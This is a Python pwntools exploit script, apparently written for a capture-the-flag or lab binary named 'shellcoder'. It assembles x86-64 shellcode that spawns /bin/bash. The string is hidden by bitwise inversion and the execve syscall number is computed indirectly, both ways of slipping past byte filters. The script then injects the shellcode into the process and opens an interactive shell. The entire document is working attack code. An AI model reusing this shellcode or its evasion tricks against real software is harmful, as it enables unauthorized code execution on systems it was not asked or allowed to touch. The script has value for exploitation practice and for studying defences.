from pwn import *

context.binary = './shellcoder'
conn = process("./shellcoder")

def prepare_string(string):
	vals = []
	string += chr(0) * (8 - len(string) % 8)  # Pad the string to be 8-byte aligned
	string = "".join(reversed(string)).encode()  # Reverse the string

	for i in range(0, len(string), 8):
		seg = string[i: min(i + 8, len(string))]  # Extract the given segment
		seg = "0x" + "".join(hex(~char & 0xff)[2:] for char in seg)  # Get the binary inverse in hex for each char
		vals.append(seg)
	
	return vals

seg1, seg2 = prepare_string("/bin/bash")
print(seg1, seg2)

# execve = 59

shellcode = asm(f'''
	movabs rax, {seg1}
	not rax
	push rax
	
	movabs rax, {seg2}
	not rax
	push rax
	
	lea rdi, [rsp]
	
	xor rax, rax
	push rax
	
	lea rsi, [rsp]
	lea rdx, [rsp]

	push 60
	pop rax
	sub rax, 1
	
	syscall
''')

with open("sh3llc0d3r-alternate", "w+b") as f:
	f.write(shellcode)

conn.recvuntil(b"...\n")
conn.send(shellcode)
conn.interactive()
